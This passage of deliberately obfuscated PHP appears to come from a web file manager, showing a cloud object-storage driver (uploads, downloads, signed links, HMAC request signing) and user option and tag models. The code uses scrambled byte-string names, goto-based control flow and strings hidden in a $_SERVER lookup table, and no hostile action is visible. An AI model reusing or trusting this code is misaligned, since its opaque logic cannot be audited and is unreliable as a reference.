(isset($aﬂî√€§∆‚[$d»Ô£É¢É£[77]])) { $açÔçπãæä[$d»Ô£É¢É£[77]] = $aﬂî√€§∆‚[$d»Ô£É¢É£[77]]; } goto CÂªıÈ”é§; b≤Œæ∏¬ß†: $d»Ô£É¢É£ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($e∫Ÿ€—àΩ•) { return array($d»Ô£É¢É£[28] => $this->pathThis($bÀ÷™À∫ùÚ), $d»Ô£É¢É£[75] => $this->getPathOuter($bÀ÷™À∫ùÚ), $d»Ô£É¢É£[29] => $d»Ô£É¢É£[167], $d»Ô£É¢É£[160] => $this->ext($bÀ÷™À∫ùÚ), $d»Ô£É¢É£[77] => isset($aﬂî√€§∆‚[$d»Ô£É¢É£[77]]) ? $aﬂî√€§∆‚[$d»Ô£É¢É£[77]] : 0, $d»Ô£É¢É£[187] => 0, $d»Ô£É¢É£[107] => 0, $d»Ô£É¢É£[188] => !0, $d»Ô£É¢É£[189] => !0); } $açÔçπãæä = array($d»Ô£É¢É£[28] => $this->pathThis($bÀ÷™À∫ùÚ), $d»Ô£É¢É£[75] => $this->getPathOuter($bÀ÷™À∫ùÚ), $d»Ô£É¢É£[29] => $d»Ô£É¢É£[167], $d»Ô£É¢É£[187] => 0, $d»Ô£É¢É£[107] => 0, $d»Ô£É¢É£[77] => 0, $d»Ô£É¢É£[160] => $this->ext($bÀ÷™À∫ùÚ), $d»Ô£É¢É£[188] => !0, $d»Ô£É¢É£[189] => !0); goto döóÏÎõËú; CÂªıÈ”é§: return $açÔçπãæä; goto DÑÏ—‡ù√; DÑÏ—‡ù√: } private function folderInfo($eÙ‰Í®ãñﬁ, $cî»ÉÉÕ¢⁄ = false) { goto B‡å∏‰ùÇ¬; bøôƒÁòö«: if (isset($bìƒ∫ÿÍï≥[$eè≠˜⁄√¯î[190]])) { $A„Ñπ´’∆≥[$eè≠˜⁄√¯î[187]] = $bìƒ∫ÿÍï≥[$eè≠˜⁄√¯î[190]]; } return $A„Ñπ´’∆≥; goto b„Óà≥∏≥¢; B‡å∏‰ùÇ¬: $eè≠˜⁄√¯î =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($cî»ÉÉÕ¢⁄) { return array($eè≠˜⁄√¯î[28] => $this->pathThis($eÙ‰Í®ãñﬁ), $eè≠˜⁄√¯î[75] => $this->getPathOuter($eè≠˜⁄√¯î[8] . $eÙ‰Í®ãñﬁ), $eè≠˜⁄√¯î[29] => $eè≠˜⁄√¯î[76], $eè≠˜⁄√¯î[188] => !0, $eè≠˜⁄√¯î[189] => !0); } $A„Ñπ´’∆≥ = array($eè≠˜⁄√¯î[28] => $this->pathThis($eÙ‰Í®ãñﬁ), $eè≠˜⁄√¯î[75] => $this->getPathOuter($eè≠˜⁄√¯î[8] . $eÙ‰Í®ãñﬁ), $eè≠˜⁄√¯î[29] => $eè≠˜⁄√¯î[76], $eè≠˜⁄√¯î[187] => 0, $eè≠˜⁄√¯î[107] => 0, $eè≠˜⁄√¯î[188] => !0, $eè≠˜⁄√¯î[189] => !0); goto B–çúÂÃçª; B–çúÂÃçª: if ($eÙ‰Í®ãñﬁ == $eè≠˜⁄√¯î[33]) { return $A„Ñπ´’∆≥; } $eÙ‰Í®ãñﬁ = trim($eÙ‰Í®ãñﬁ, $eè≠˜⁄√¯î[8]) . $eè≠˜⁄√¯î[8]; $bìƒ∫ÿÍï≥ = $this->objectMeta($eÙ‰Í®ãñﬁ); goto bøôƒÁòö«; b„Óà≥∏≥¢: } public function listObjs($C÷ÏîâˆÆß, $c‰€¿¨◊‹÷ = null, $a¡áñ°¨¨ú = null, $AÔÖµó”œ = null) { $FÏç™ åÎò =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C÷ÏîâˆÆß = trim($C÷ÏîâˆÆß, $FÏç™ åÎò[8]); $bá£”ıÜôá = empty($C÷ÏîâˆÆß) ? $FÏç™ åÎò[33] : $C÷ÏîâˆÆß . $FÏç™ åÎò[8]; return $this->client->getBucket($this->bucket, $bá£”ıÜôá, $c‰€¿¨◊‹÷, $a¡áñ°¨¨ú, $AÔÖµó”œ, !0); } public function has($dﬂ®˜Ÿçï , $B∂Â∆†ìõÎ = false, $D‘ ı‹úÈ‚ = true) { goto E ‡≠ëØ¯ú; E ‡≠ëØ¯ú: $bÏüçÍ£‚µ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b¿â’ßäØ˘ = 0; $DË˘Ù‚ôËØ = 0; goto a¡óîå»¨å; a¡óîå»¨å: $B”ÈØ¨›Ã = $this->listObjs($dﬂ®˜Ÿçï , null, null, $bÏüçÍ£‚µ[8]); $B”ÈØ¨›Ã = is_array($B”ÈØ¨›Ã) ? $B”ÈØ¨›Ã : array(); foreach ($B”ÈØ¨›Ã as $eïâ◊ŸÎ‚è) { if (isset($eïâ◊ŸÎ‚è[$bÏüçÍ£‚µ[28]]) && substr($eïâ◊ŸÎ‚è[$bÏüçÍ£‚µ[28]], -1) != $bÏüçÍ£‚µ[8]) { if (!$B∂Â∆†ìõÎ && $D‘ ı‹úÈ‚) { return !0; } $b¿â’ßäØ˘++; } else { if (isset($eïâ◊ŸÎ‚è[$bÏüçÍ£‚µ[186]])) { if (!$B∂Â∆†ìõÎ && !$D‘ ı‹úÈ‚) { return !1; } $DË˘Ù‚ôËØ++; } } } goto EÈπ„–¬∏◊; EÈπ„–¬∏◊: if ($B∂Â∆†ìõÎ) { return array($bÏüçÍ£‚µ[191] => $b¿â’ßäØ˘, $bÏüçÍ£‚µ[192] => $DË˘Ù‚ôËØ); } return !1; goto EÉßÛ∂üÁ—; EÉßÛ∂üÁ—: } public function listAll($bßï†™åèÚ) { $cÖ”«å‡—∫ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cåÚüœ◊¨Ü = $this->listObjs($bßï†™åèÚ); $Fâë¯¯•ÑÊ = $f˜éîÒù ß = array(); foreach ($cåÚüœ◊¨Ü as $cèÎﬁ†Æ≥ê => $b∞â›ÂÜ¨à) { $Fâë¯¯•ÑÊ[] = $b∞â›ÂÜ¨à[$cÖ”«å‡—∫[28]]; $f˜éîÒù ß[$cèÎﬁ†Æ≥ê] = $b∞â›ÂÜ¨à[$cÖ”«å‡—∫[77]]; } return $this->listAllFiles($bßï†™åèÚ, $Fâë¯¯•ÑÊ, $f˜éîÒù ß); } public function canRead($fÑ§ø‘á„Û) { $Aï‚ÜÖ™√ò =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FÇ´Ç÷±úè = $this->client->getAccessControlPolicy($this->bucket, $fÑ§ø‘á„Û); if (!$FÇ´Ç÷±úè) { return !1; } return in_array($FÇ´Ç÷±úè, array($Aï‚ÜÖ™√ò[193], $Aï‚ÜÖ™√ò[194], $Aï‚ÜÖ™√ò[195])) ? !0 : !1; } public function canWrite($b¢ŒªÏª‰˘) { $DÎ∞ç•’ßô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÀΩØ◊ÕÓ’ = $this->client->getAccessControlPolicy($this->bucket, $b¢ŒªÏª‰˘); if (!$cÀΩØ◊ÕÓ’) { return !1; } return in_array($cÀΩØ◊ÕÓ’, array($DÎ∞ç•’ßô[193], $DÎ∞ç•’ßô[194])) ? !0 : !1; } public function getContent($d»§µªÑ±ç) { return $this->client->getObject($this->bucket, $d»§µªÑ±ç); } public function setContent($aã∏ËÖÊ¶ö, $dËÖ¿–ˆõà = '', $aí€≥Â Ÿƒ = false) { goto c‡ªáˆµ†®; c‡ªáˆµ†®: $cπ‹ÌˆèÂ∏ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aã∏ËÖÊ¶ö = $aí€≥Â Ÿƒ ? trim($aã∏ËÖÊ¶ö, $cπ‹ÌˆèÂ∏[8]) . $cπ‹ÌˆèÂ∏[8] : $aã∏ËÖÊ¶ö; $aÇÃùÎ«áÚ = get_file_mime(get_path_ext($aã∏ËÖÊ¶ö)); goto Eá∫◊≈‡π’; C´◊∑“≥≤±: $Bÿ∑ÛæµË´ = $this->copyFile($aã∏ËÖÊ¶ö, $aã∏ËÖÊ¶ö, array($cπ‹ÌˆèÂ∏[196] => $Bÿ∑ÛæµË´[$cπ‹ÌˆèÂ∏[197]])); return $Bÿ∑ÛæµË´ ? !0 : !1; goto Bä°ëâΩ¡÷; Eá∫◊≈‡π’: $Bÿ∑ÛæµË´ = $this->client->putObject($dËÖ¿–ˆõà, $this->bucket, $aã∏ËÖÊ¶ö, $cπ‹ÌˆèÂ∏[185], array(), $aÇÃùÎ«áÚ); if (!$Bÿ∑ÛæµË´) { return !1; } if ($aí€≥Â Ÿƒ) { return !0; } goto C´◊∑“≥≤±; Bä°ëâΩ¡÷: } public function fileSubstr($d¬ Éä°ËΩ, $fêÛé©¢îﬁ, $AÉÀÎ°ƒ˘Í) { $b·–…«êê√ = $fêÛé©¢îﬁ + $AÉÀÎ°ƒ˘Í - 1; return $this->client->getObject($this->bucket, $d¬ Éä°ËΩ, array($_SERVER[Ä¿¡‡öóµŸﬂ‡][198] => "\x62\171\164\145\x73\75{$fêÛé©¢îﬁ}\x2d{$b·–…«êê√}")); } public function upload($eœÇÜÏÜû´, $a˜∏¶Î¨æ‚, $Dπ¯î—Øüç = false, $cöôò©ÓºÛ = REPEAT_REPLACE) { $F“ä¥ÕçÕà =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bﬂ€ıÓŒÊì = array($F“ä¥ÕçÕà[196] => @md5_file($a˜∏¶Î¨æ‚)); $féØª¿ºÇ˘ = array($F“ä¥ÕçÕà[199] => get_file_mime(get_path_ext($eœÇÜÏÜû´))); if (IO::size($a˜∏¶Î¨æ‚) <= 1024 * 1024 * 200) { $d∏¬°âÒó÷ = $this->client->putObjectFile($a˜∏¶Î¨æ‚, $this->bucket, $eœÇÜÏÜû´, $F“ä¥ÕçÕà[185], $Bﬂ€ıÓŒÊì, $féØª¿ºÇ˘); return !empty($d∏¬°âÒó÷) ? $this->getPathOuter($eœÇÜÏÜû´) : !1; } $dâã÷á¬ˆò = $this->client->multiUploadObject($a˜∏¶Î¨æ‚, $this->bucket, trim($eœÇÜÏÜû´, $F“ä¥ÕçÕà[8]), $Bﬂ€ıÓŒÊì, $féØª¿ºÇ˘); return $dâã÷á¬ˆò ? $this->getPathOuter($eœÇÜÏÜû´) : !1; } public function download($FúË¥Û©á´, $dÚñ≠Ìñ‡œ) { if (!@is_dir($this->pathFather($dÚñ≠Ìñ‡œ)) && !IO::mkdir($this->pathFather($dÚñ≠Ìñ‡œ))) { return !1; } $cöç—Êú‰… = $this->client->getObject($this->bucket, $FúË¥Û©á´, array(), $dÚñ≠Ìñ‡œ); return $cöç—Êú‰… !== !1 ? $dÚñ≠Ìñ‡œ : !1; } public function link($B∞Öë€¯’è, $C≈îäçáÕ“ = array()) { $d≠˜ Úé≥… =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($this->signVer == $d≠˜ Úé≥…[200]) { return $this->client->getAuthenticatedURL($this->bucket, $B∞Öë€¯’è, 3600 * 12, $C≈îäçáÕ“); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($B∞Öë€¯’è, $d≠˜ Úé≥…[8]), 3600 * 12, $this->region, array(), !0, $C≈îäçáÕ“); } public function fileOut($aˆ≈çõ¿íÈ, $AÍ¥∏ôº¶˘ = false, $DãœÌ√¢™’ = false, $Bü¨¡—öÀ– = '') { goto d±ñ§√πç¯; d±ñ§√πç¯: $eõåß≤ŒÑπ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$DãœÌ√¢™’) { $DãœÌ√¢™’ = $this->pathThis($aˆ≈çõ¿íÈ); } $f„ﬂ‚‚†Ìò = get_file_mime(get_path_ext($DãœÌ√¢™’)); goto Aòƒ≠∞®æœ; AÖ◊ÿ≥ìä®: $FπÇ¢ÀπÛä = $this->link($aˆ≈çõ¿íÈ, $FçÁ±î¬ò–); $this->fileOutLink($FπÇ¢ÀπÛä); goto d˜Û•åÎ∆«; Aòƒ≠∞®æœ: if ($f„ﬂ‚‚†Ìò == $eõåß≤ŒÑπ[201]) { return parent::fileOut($aˆ≈çõ¿íÈ, $AÍ¥∏ôº¶˘, $DãœÌ√¢™’, $Bü¨¡—öÀ–); } $AÍ¥∏ôº¶˘ = $AÍ¥∏ôº¶˘ ? $eõåß≤ŒÑπ[202] : $eõåß≤ŒÑπ[203]; $FçÁ±î¬ò– = array($eõåß≤ŒÑπ[204] => $AÍ¥∏ôº¶˘ . $eõåß≤ŒÑπ[205] . rawurlencode($DãœÌ√¢™’), $eõåß≤ŒÑπ[206] => $f„ﬂ‚‚†Ìò); goto AÖ◊ÿ≥ìä®; d˜Û•åÎ∆«: } public function fileOutServer($A•Íπää¶Œ, $Aò€¬Á•„… = false, $B¿ÑµœÃ£Æ = false, $dÓèøü‘Ê∆ = '') { parent::fileOut($A•Íπää¶Œ, $Aò€¬Á•„…, $B¿ÑµœÃ£Æ, $dÓèøü‘Ê∆); } public function fileOutImage($cñÚ’ ƒ¢Ø, $B–Ñà†à©å = 250) { $EˆÕÇ°Ó„„ = $this->link($cñÚ’ ƒ¢Ø); $this->fileOutLink($EˆÕÇ°Ó„„); } public function fileOutImageServer($Aøé‘ﬂ±µ«, $a∞Ñé÷ó∫“ = 250) { parent::fileOutImage($Aøé‘ﬂ±µ«, $a∞Ñé÷ó∫“); } public function hashMd5($aë…◊À≠ñ®, $d˜˜Ø–‰ﬂ¥ = '') { $cç⁄ﬁüÜèÜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Dó±ÜáñáÕ = $this->objectMeta($aë…◊À≠ñ®); if (!$Dó±ÜáñáÕ) { return !1; } $d˜˜Ø–‰ﬂ¥ = $d˜˜Ø–‰ﬂ¥ ? $d˜˜Ø–‰ﬂ¥ : _get($Dó±ÜáñáÕ, $cç⁄ﬁüÜèÜ[207]); $d˜˜Ø–‰ﬂ¥ = $d˜˜Ø–‰ﬂ¥ ? $d˜˜Ø–‰ﬂ¥ : _get($Dó±ÜáñáÕ, $cç⁄ﬁüÜèÜ[197], $cç⁄ﬁüÜèÜ[33]); return $d˜˜Ø–‰ﬂ¥; } public function uploadFormData($e≈æÏÜ¶ôô, $fç≠÷“ÈÓﬂ = 3600) { $fêÑı≈æÛà =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BÔ◊∫åú©Æ = $this->pathFather($e≈æÏÜ¶ôô); $D»éåÑƒØá = $this->client->getHttpUploadPostParams($this->bucket, $BÔ◊∫åú©Æ, $fêÑı≈æÛà[185], $fç≠÷“ÈÓﬂ); return array_merge((array) $D»éåÑƒØá, array($fêÑı≈æÛà[169] => $this->getHost())); } public function multiUploadFormData($F∂∑ùä≤„Ù, $E¨åÁ£Ìªí = 3600) { $cÜ¿•Ï©ìÔ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÈ∆À≠û©º = gmdate($cÜ¿•Ï©ìÔ[208]); $døî°ä◊‡º = array(); $BÊîøàó≠ = $this->client->getUploadId($this->bucket, $F∂∑ùä≤„Ù, $døî°ä◊‡º); if (!$BÊîøàó≠) { return !1; } return array($cÜ¿•Ï©ìÔ[209] => $BÊîøàó≠, $cÜ¿•Ï©ìÔ[169] => $this->getHost() . $cÜ¿•Ï©ìÔ[8] . $this->pathEncode($F∂∑ùä≤„Ù), $cÜ¿•Ï©ìÔ[210] => $cÈ∆À≠û©º, $cÜ¿•Ï©ìÔ[89] => $F∂∑ùä≤„Ù); } public function multiUploadAuthData($B©ÒÜ”â’—, $aú¿˜É”±· = array()) { goto Fûÿø¢éÏ†; e‹òÙàì∑æ: $eÔÿ¶¶√µ = $aú¿˜É”±·[$b›âÁ£¬π…[89]]; unset($aú¿˜É”±·[$b›âÁ£¬π…[89]]); if (isset($aú¿˜É”±·[$b›âÁ£¬π…[211]])) { $aú¿˜É”±·[$b›âÁ£¬π…[210]] = $Bçœ÷êâÇñ; return $this->listUploadParts($eÔÿ¶¶√µ, $aú¿˜É”±·); } goto C›í«Öï‰ó; bö™üø–Î∫: $fÒ´„îÉœ— = implode($b›âÁ£¬π…[217], $EÇ«ê¿Ω‰Â); $E≥€„ßÛáÇ = base64_encode(hash_hmac($b›âÁ£¬π…[218], $fÒ´„îÉœ—, $this->secret, !0)); $d”Û„”åì® = $b›âÁ£¬π…[219] . $this->accessKey . $b›âÁ£¬π…[4] . $E≥€„ßÛáÇ; goto BÓä–£Ú“ß; Fûÿø¢éÏ†: $b›âÁ£¬π… =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bçœ÷êâÇñ = isset($aú¿˜É”±·[$b›âÁ£¬π…[210]]) ? $aú¿˜É”±·[$b›âÁ£¬π…[210]] : gmdate($b›âÁ£¬π…[208]); $eö®ï”ä±∏ = isset($aú¿˜É”±·[$b›âÁ£¬π…[160]]) ? $aú¿˜É”±·[$b›âÁ£¬π…[160]] : $b›âÁ£¬π…[33]; goto e‹òÙàì∑æ; BÓä–£Ú“ß: if (strpos($eö®ï”ä±∏, $b›âÁ£¬π…[213]) === 0) { return array($b›âÁ£¬π…[220] => $d”Û„”åì®, $b›âÁ£¬π…[210] => $Bçœ÷êâÇñ); } return $d”Û„”åì®; goto aƒ¢µ≥¢ôé; C›í«Öï‰ó: $EÇ«ê¿Ω‰Â = array($b›âÁ£¬π…[212], $b›âÁ£¬π…[33], $b›âÁ£¬π…[116], $b›âÁ£¬π…[33], "\x78\55\x61\155\172\x2d\144\x61\x74\x65\72{$Bçœ÷êâÇñ}", $b›âÁ£¬π…[8] . $this->bucket . $b›âÁ£¬π…[8] . $this->pathEncode($eÔÿ¶¶√µ) . $eö®ï”ä±∏); if (strpos($eö®ï”ä±∏, $b›âÁ£¬π…[213]) === 0) { $EÇ«ê¿Ω‰Â[0] = $b›âÁ£¬π…[214]; } if (isset($aú¿˜É”±·[$b›âÁ£¬π…[215]]) && $aú¿˜É”±·[$b›âÁ£¬π…[215]] == $b›âÁ£¬π…[216]) { $EÇ«ê¿Ω‰Â[0] = $b›âÁ£¬π…[216]; } goto bö™üø–Î∫; aƒ¢µ≥¢ôé: } public function listUploadParts($F⁄É√Û¶Úâ, $aâ—§¯àÂŒ = array()) { goto eÇ€∞ûÎÍ¡; cøÁ—âŒö≠: if (!$EﬂÊÀıÀ©Û) { return !1; } unset($aâ—§¯àÂŒ[$fπ≤ ŒÂ∆À[211]], $aâ—§¯àÂŒ[$fπ≤ ŒÂ∆À[215]]); $aâ—§¯àÂŒ[$fπ≤ ŒÂ∆À[89]] = $F⁄É√Û¶Úâ; goto D∞Œﬁ«†≠ú; D∞Œﬁ«†≠ú: $e€±ºµºâŸ = $this->multiUploadAuthData($F⁄É√Û¶Úâ, $aâ—§¯àÂŒ); if (empty($e€±ºµºâŸ)) { return !1; } return array($fπ≤ ŒÂ∆À[220] => $e€±ºµºâŸ, $fπ≤ ŒÂ∆À[210] => $aâ—§¯àÂŒ[$fπ≤ ŒÂ∆À[210]], $fπ≤ ŒÂ∆À[222] => $EﬂÊÀıÀ©Û); goto aêéÓíı≠Ø; eÇ€∞ûÎÍ¡: $fπ≤ ŒÂ∆À =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c›œãë∆ˆŸ = str_replace($fπ≤ ŒÂ∆À[221], $fπ≤ ŒÂ∆À[33], $aâ—§¯àÂŒ[$fπ≤ ŒÂ∆À[160]]); $EﬂÊÀıÀ©Û = $this->client->listParts($this->bucket, $F⁄É√Û¶Úâ, $c›œãë∆ˆŸ); goto cøÁ—âŒö≠; aêéÓíı≠Ø: } public function getHost() { return parent::getHost() . $_SERVER[Ä¿¡‡öóµŸﬂ‡][8] . $this->bucket; } public function size($F¢ÉƒÚÈœà) { $DÂ™®∆»ßï = $this->objectMeta($F¢ÉƒÚÈœà); return $DÂ™®∆»ßï ? $DÂ™®∆»ßï[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]] : 0; } public function info($b∞´Òõ„¬‡) { if ($this->isFolder($b∞´Òõ„¬‡)) { return $this->folderInfo($b∞´Òõ„¬‡); } else { if ($this->isFile($b∞´Òõ„¬‡)) { return $this->fileInfo($b∞´Òõ„¬‡); } } return !1; } public function exist($CÎêÍæ⁄ä¢) { return $this->isFile($CÎêÍæ⁄ä¢) || $this->isFolder($CÎêÍæ⁄ä¢); } public function isFile($BéëÇ“®≈∂) { return !$this->isFolder($BéëÇ“®≈∂) && $this->objectMeta($BéëÇ“®≈∂); } public function isFolder($E≠’‘“ˆì¶) { return $this->cacheMethod($_SERVER[Ä¿¡‡öóµŸﬂ‡][223], $E≠’‘“ˆì¶); } protected function objectMeta($B´àıçÇ¯ë) { return $this->cacheMethod($_SERVER[Ä¿¡‡öóµŸﬂ‡][224], $B´àıçÇ¯ë); } protected function _objectMeta($f·ÉÔÃàÜä) { $aï«¡±Ñé =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f·ÉÔÃàÜä = rtrim($f·ÉÔÃàÜä, $aï«¡±Ñé[8]); try { $böã⁄˜¨∏Ö = $this->client->getObjectInfo($this->bucket, $f·ÉÔÃàÜä); if (!isset($böã⁄˜¨∏Ö[$aï«¡±Ñé[207]]) && isset($böã⁄˜¨∏Ö[$aï«¡±Ñé[225]])) { $böã⁄˜¨∏Ö[$aï«¡±Ñé[207]] = $böã⁄˜¨∏Ö[$aï«¡±Ñé[225]]; } } catch (Exception $d…±À§«±ú) { $böã⁄˜¨∏Ö = !1; } if (!$böã⁄˜¨∏Ö) { } return $böã⁄˜¨∏Ö; } protected function _isFolder($E•§ä· ò¡) { goto aΩ’´§ñÿÆ; C„—“¬å∂£: if (substr($A¯‡‚æÂéä[0][$DÌ‘˜º˘ﬁÿ[28]], -1) == $DÌ‘˜º˘ﬁÿ[8]) { return !0; } if (get_path_this($A¯‡‚æÂéä[0][$DÌ‘˜º˘ﬁÿ[28]]) == get_path_this($E•§ä· ò¡)) { return !1; } return !0; goto EéÈ˘ˆ§ßÔ; eÇ‚“–Â◊ó: $A¯‡‚æÂéä = $this->client->getBucket($this->bucket, $E•§ä· ò¡, null, 1); if (empty($A¯‡‚æÂéä)) { return !1; } $A¯‡‚æÂéä = array_values($A¯‡‚æÂéä); goto C„—“¬å∂£; aΩ’´§ñÿÆ: $DÌ‘˜º˘ﬁÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E•§ä· ò¡ = rtrim($E•§ä· ò¡, $DÌ‘˜º˘ﬁÿ[8]); if ($E•§ä· ò¡ == $DÌ‘˜º˘ﬁÿ[33] || $E•§ä· ò¡ == $DÌ‘˜º˘ﬁÿ[8]) { return !0; } goto eÇ‚“–Â◊ó; EéÈ˘ˆ§ßÔ: } } define($_SERVER[Ä¿¡‡öóµŸﬂ‡][226], 1); goto c©à∞Çìô; C©ë◊Íè¢«: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\137\x6f\160\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($cÂ…Üó‘ç¨) { $dãï‹öçÎ≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!defined($dãï‹öçÎ≥[427])) { define($dãï‹öçÎ≥[427], 0); } return "\x55\163\x65\162\x4f\160\164\151\x6f\156\137{$cÂ…Üó‘ç¨}\x5f" . USER_ID; } protected function filterWhere($F†Œ“Ï‡–∂) { $cë˜®ç≈ µ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!defined($cë˜®ç≈ µ[427])) { define($cë˜®ç≈ µ[427], 0); } $F†Œ“Ï‡–∂[$cë˜®ç≈ µ[1438]] = USER_ID; return $F†Œ“Ï‡–∂; } public function cacheRemoveUser($F÷¶¨ˆëÂ∞, $E¢∑≈≠ÜÏÎ) { return Cache::remove("\x55\163\x65\x72\x4f\160\x74\151\157\156\137{$F÷¶¨ˆëÂ∞}\137" . $E¢∑≈≠ÜÏÎ); } protected function optionDefault($CÊ∂Ø÷ìŸÇ = '') { $eé∏å∫Ÿí— =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($CÊ∂Ø÷ìŸÇ == $eé∏å∫Ÿí—[33]) { return $GLOBALS[$eé∏å∫Ÿí—[6]][$eé∏å∫Ÿí—[2541]]; } if ($CÊ∂Ø÷ìŸÇ == $eé∏å∫Ÿí—[2542]) { return $GLOBALS[$eé∏å∫Ÿí—[6]][$eé∏å∫Ÿí—[2543]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\x2e\164\x61\x67\x4c\x69\163\164"; public $modelType = "\125\163\145\162\x4f\x70\x74\151\157\x6e"; public $field = array("\156\x61\155\x65", "\163\x74\171\x6c\x65", "\163\x6f\162\x74"); public function listData($eûÍáƒë©— = false, $fü≈ﬁΩÊ◊´ = "\x73\x6f\x72\x74", $CËÊëÁ”à´ = false) { return parent::listData($eûÍáƒë©—, $fü≈ﬁΩÊ◊´, $CËÊëÁ”à´); } public function remove($Eﬂêº¬ª‚⁄) { return parent::remove($Eﬂêº¬ª‚⁄); } public function add($bá¥êìáË», $D€€·»ìÀö = "\154\141\142\145\x6c\55\x67\162\145\x79\55\156\x6f\162\155\x61\154") { $a¨ÙêıÎ‰Ø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($this->findByName($bá¥êìáË»)) { return !1; } $bÚùÃ≠ÙËÌ = array($a¨ÙêıÎ‰Ø[386] => $bá¥êìáË», $a¨ÙêıÎ‰Ø[437] => $D€€·»ìÀö, $a¨ÙêıÎ‰Ø[2110] => $this->getSort($a¨ÙêıÎ‰Ø[246]) + 1); return parent::insert($bÚùÃ≠ÙËÌ); } public function update($Eù†æ∫ﬂŒï, $dÜÛ√ë≥ÿ ) { $fÍÛúÖ∂À∞ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C˜†€ü“ÓŒ = $this->listData($Eù†æ∫ﬂŒï); $BÜÆè¢ÇÜË = $this->findByName($dÜÛ√ë≥ÿ [$fÍÛúÖ∂À∞[28]]); if (!$C˜†€ü“ÓŒ || $BÜÆè¢ÇÜË && $BÜÆè¢ÇÜË[$fÍÛúÖ∂À∞[367]] != $C˜†€ü“ÓŒ[$fÍÛúÖ∂À∞[367]]) { return !1; } return parent::update($Eù†æ∫ﬂŒï, $dÜÛ√ë≥ÿ ); } public function moveTop($F‹”ÜıÁìÖ) { $EÓﬁ«È≤É  =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f»â€ïﬁêñ = parent::listData(); $BØåÆ©òÛ¯ = $this->getSort($EÓﬁ«È≤É [245]); foreach ($f»â€ïﬁêñ as &$Aﬂ“á·û∞–) { if ($Aﬂ“á·û∞–[$EÓﬁ«È≤É [367]] == $F‹”ÜıÁìÖ) { $Aﬂ“á·û∞–[$EÓﬁ«È≤É [2127]] = $BØåÆ©òÛ¯; continue; } $Aﬂ“á·û∞–[$EÓﬁ«È≤É [2127]] += 1; } return parent::resetData($f»â€ïﬁêñ); } public function moveBottom($aôõÓ˜å‡ä) { $Fê‚Òâ‘ßÚ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A”ç±ŸèçÑ = $this->getSort($Fê‚Òâ‘ßÚ[246]) + 1; return parent::update($aôõÓ˜å‡ä, array($Fê‚Òâ‘ßÚ[2127] => $A”ç±ŸèçÑ)); } public function resetSort($e·ıÁﬁ»Ö´) { goto béê®±»åò; DÀî∆Á Ãõ: return parent::resetData($d«∆çê‚…Ü); goto B‘ñﬁÀØñ«; b∞†∞Ú£î∫: for ($C≈ˆ‚€ê§ä = 0; $C≈ˆ‚€ê§ä < count($e·ıÁﬁ»Ö´); $C≈ˆ‚€ê§ä++) { $cõ—…é¥öÖ[$e·ıÁﬁ»Ö´[$C≈ˆ‚€ê§ä] . $Fë‘ﬁ∫ Ì∫[33]] = $C≈ˆ‚€ê§ä + 1; } $d«∆çê‚…Ü = parent::listData(); foreach ($d«∆çê‚…Ü as &$d˘åâ±ÕÛ) { $Eµ¬êúËµô = $cõ—…é¥öÖ[$d˘åâ±ÕÛ[$Fë‘ﬁ∫ Ì∫[367]]]; $d˘åâ±ÕÛ[$Fë‘ﬁ∫ Ì∫[2127]] = $Eµ¬êúËµô ? $Eµ¬êúËµô : $d˘åâ±ÕÛ[$Fë‘ﬁ∫ Ì∫[2127]]; } goto DÀî∆Á Ãõ; béê®±»åò: $Fë‘ﬁ∫ Ì∫ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cõ—…é¥öÖ = array(); $e·ıÁﬁ»Ö´ = is_array($e·ıÁﬁ»Ö´) ? $e·ıÁﬁ»Ö´ : array(); goto b∞†∞Ú£î∫; B‘ñﬁÀØñ«: } private function getSort($BÒê≥ÑÁΩä) { $AÌó–ç¥¶ø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cëèá≠æŒ‡ = parent::listData(); $Dπ∏„…µ˘“ = array_to_keyvalue($cëèá≠æŒ‡, $AÌó–ç¥¶ø[33], $AÌó–ç¥¶ø[2127]); if (!$Dπ∏„…µ˘“) { $Dπ∏„…µ˘“ = array(0); } $f€Ñ ùôÆ› = $BÒê≥ÑÁΩä == $AÌó–ç¥¶ø[246] ? max($Dπ∏„…µ˘“) : min($Dπ∏„…µ˘“); return intval($f€Ñ ùôÆ›); } } goto d¢ÉØá∆´–; b†™í•¢∆ö: function ActionCall($Fœ∞â“ËıË) { $D§ó¨†éÛê = array_slice(func_get_args(), 1); return ActionApply($Fœ∞â“ËıË, $D§ó¨†éÛê); } function ActionCallApi($bÎ≈¶∫ñ›ç, $f˜≤™Ø‡‹≠ = '') { goto eπÛ“◊√ﬂ´; f¶π‚ëãÙµ: return $AõÃÂÇ®Ëà; goto c¿¯Ã–âŸœ; 